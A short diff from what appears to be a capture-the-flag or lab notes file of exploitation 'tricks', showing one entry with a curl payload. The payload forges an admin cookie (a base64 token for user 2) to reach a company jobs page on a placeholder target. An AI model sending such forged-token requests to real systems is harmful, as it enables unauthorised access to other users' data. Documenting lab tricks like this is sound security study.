@@ -43,4 +43,3 @@ tricks:
     how: "Forge admin cookie and access /company/2/jobs"
     payload: |
       curl "http://TARGET/company/2/jobs" -H "Cookie: access_token=Bearer Mg=="
-
